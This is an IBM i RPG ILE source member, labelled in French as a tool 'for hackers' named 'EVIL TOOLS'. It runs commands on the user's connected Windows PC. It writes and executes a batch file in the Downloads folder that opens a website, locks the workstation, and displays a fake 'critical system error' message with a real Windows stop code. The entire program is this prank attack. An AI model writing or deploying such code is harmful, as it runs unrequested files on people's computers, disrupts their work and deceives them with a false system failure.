---
bibliotheque: BIB10
fichier_source: RPGLESRCNO
membre: NONE
type: RPG/RPG-ILE
longueur_enregistrement: 120
lignes: 48
modifie: 2026-11-16
---

# BIB10/RPGLESRCNO/NONE

```rpg
**FREE
// ----------------------------------------------------------------------//
//   Programme     : NONE                                                //
//   Libelle       : programme qui ecrit le fichier bat                  //
//   Observation   : Destiné aux hackers                                 //
//   Utilisation   : Batch                                               //
// ----------------------------------------------------------------------//
// ----------------------------------------------------------------------//
//   21/05/2024 | Perry Kyle | "EVIL TOOLS"  |  Send file src            //
// ----------------------------------------------------------------------//
// ----------------------------------------------------------------------//
//   Propritaire :  Devil                                                //
// ----------------------------------------------------------------------//

// **********************************************************************//
// Dclaration des spcificit (carte H)                                    //
// **********************************************************************//
CTL-OPT COPYRIGHT('(C) ORGFORM 2023.') USRPRF(*OWNER) OPTIMIZE(*FULL) DFTACTGRP(*NO) ACTGRP(*CALLER) DATFMT(*ISO)
TIMFMT(*ISO) ALLOC(*STGMDL) STGMDL(*INHERIT) THREAD(*SERIALIZE);

// **********************************************************************//
// Dclaration des variables                                              //
// **********************************************************************//
DCL-S cmd        char(300);                      // Commande qui est executée

// **********************************************************************//
// Traitement principale                                                 //
// **********************************************************************//
cmd = 'STRPCO';
EXEC SQL
  CALL QSYS2.QCMDEXC(:cmd);

cmd = 'STRPCCMD PCCMD(''cmd /c echo start https://www.croissantage.com/ > "%USERPROFILE%\Downloads\devil.bat"'+
      ' && "%USERPROFILE%\Downloads\devil.bat"'')';
EXEC SQL
  CALL QSYS2.QCMDEXC(:cmd);

cmd = 'STRPCCMD PCCMD(''rundll32.exe user32.dll,LockWorkStation'')';
EXEC SQL
  CALL QSYS2.QCMDEXC(:cmd);

cmd = 'STRPCCMD PCCMD(''cmd /k echo ERREUR SYSTEME CRITIQUE & echo CODE : 0xC000021A & echo Un problème grave ' +
  'est survenu dans le système Windows.'')';

EXEC SQL
  CALL QSYS2.QCMDEXC(:cmd);

*INLR = *ON;
```
